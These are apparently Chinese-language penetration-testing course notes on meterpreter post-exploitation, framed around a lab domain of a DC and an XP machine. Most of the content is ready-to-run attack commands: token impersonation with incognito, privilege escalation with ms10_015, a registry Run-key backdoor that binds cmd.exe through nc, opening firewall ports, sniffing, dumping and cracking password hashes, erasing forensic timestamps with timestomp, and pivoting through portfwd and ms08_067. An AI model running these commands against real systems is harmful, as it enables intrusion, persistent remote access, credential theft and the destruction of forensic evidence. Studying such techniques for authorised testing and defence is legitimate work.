

# 后渗透测试阶段（二）

* Tokens
* Incognito
* 注册表
* 抓包（meterpreter）
* 搜索文件
* 时间
* Pivoting 跳板 / 枢纽 / 支点

## Tokens
> - 用户每次登录，账号绑定临时的Token  
> - 访问资源时提交Token进行身份验证，类似于WEB Cookie
> - Delegate Token：交互登录会话
> - Impersonate Token：非交互登录会话
> - Delegate Token账号注销后变为Impersonate Token，权限依然有效


## Incognito
* 描述
> 独立功能的软件，被MSF集成在meterpreter中  
> 无需密码破解或获取密码HASH，窃取Token将自己伪装成其他用户  
> 尤其适用于域环境下提权渗透多操作系统


* 搭建域环境
> DC+XP


* load incognito
``` 
list_tokens -u
impersonate_token   lab\\administrator
运行以上命令getsystem
    本地普通权限用户需先本地提权
    use exploit/windows/local/ms10_015_kitrap0d
    execute -f cmd.exe -i -t 　　　　　　// -t：使用当前假冒token执行程序
    shell
```
  　　
## 注册表

* 描述
> 注册表保存着windows几乎全部配置参数  
> 如果配置不当，可直接造成系统崩溃    
> 修改前完整备份注册表  
> 某些注册表的修改是不可逆的   

* 常见用途
> 修改、增加启动项  
> 窃取存储于注册表中的机密信息  
> 绕过文件型病毒查杀  

* 用注册表添加NC后门服务（meterpreter）
``` 
upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc    -d 'C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe'
reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run   -v nc
```
* 打开防火墙端口（meterpreter）
``` 
execute -f cmd -i -H
netsh firewall show opmode
netsh firewall add portopening TCP 4444 "test" ENABLE ALL
shutdown -r -t 0
nc 1.1.1.1 4444

```

* 其他注册表项
``` 
https://support.accessdata.com/hc/en-us/articles/204448155-Registry-Quick-Find-Chart
```


## 抓包（meterpreter）
``` 
load sniffer
sniffer_interfaces
sniffer_start 2
sniffer_dump 2 1.cap / sniffer_dump 2 1.cap
// 在内存中缓冲区块循环存储抓包（50000），不写硬盘
// 智能过滤meterpreter流量，传输全程使用SSL/TLS 加密
```
* 解码
``` 
use auxiliary/sniffer/psnuffle
set PCAPFILE 1.cap
```

## 搜索文件

* 描述
> 文件系统访问会留下痕迹，电子取证重点关注  
> 渗透测试和攻击者往往希望销毁文件系统访问痕迹  
> 最好的避免被电子取证发现的方法：不要碰文件系统  
    -Meterpreter 的先天优势所在（完全基于内存）

``` 
search -f *.ini
search -d c:\\documents\ and\ settings\\administrator\\desktop\\ -f *.docx
// John the Ripper 破解弱口令
use post/windows/gather/hashdump 　　　　// system权限的meterpreter
Run　　　　　　　　　　　　　　　　　　 // 记过保存在/tmp目录下
use auxiliary/analyze/jtr_crack_fast
run
```

## 时间
* MAC 时间（Modified / Accessed / Changed）
``` 
ls -l --time=atime/mtime/ctime 1.txt
stat 1.txt
touch -d "2 days ago" 1.txt
touch -t 1501010101 1.txt
```


* MACE ：MFT entry
> - MFT：NTFS 文件系统的主文件分配表 Master File Table
> - 通常1024字节或 2 个硬盘扇区，其中存放多项entry 信息
> - 包含文件大量信息（大小、名称、目录位置、磁盘位置、创建日期）
> - 更多信息可研究 文件系统取证分析技术


* Timestomp (meterpreter)
``` 
timestomp -v 1.txt
timestomp -f c:\\autoexec.bat 1.txt
-b -r 　　　　　　　　// 擦除MACE时间信息，目前此参数功能失效
-m / -a / -c / -e / -z
timestomp -z "MM/DD/YYYY HH24:MI:SS" 2.txt
```


* Pivoting 跳板 / 枢纽 / 支点
> 利用已经控制的一台计算机作为入侵内网的跳板  
> 在其他内网计算机  
> run autoroute -s 1.1.1.0/24　　　　　　 #不能访问外网的被攻击目标内网网段

* 自动路由   现实场景
``` 
利用win 7攻击内网XP（对比xp有无外网访问权的情况）
扫描内网：use auxiliary/scanner/portscan/tcp
```

* Pivoting 之端口转发 Portfwd
``` 
// 利用已经被控计算机，在kali与攻击目标之间实现端口转发
portfwd add -L LIP -l LPORT -r RIP -p RPORT
portfwd add -L 1.1.1.10 -l 445 -r 2.1.1.11 -p 3389
portfwd list / delete / flush
```


``` 
use exploit/windows/smb/ms08_067_netapi
set RHOST 127.0.0.1
set LHOST 2.1.1.10

use exploit/multi/handler
set exitonsession false
```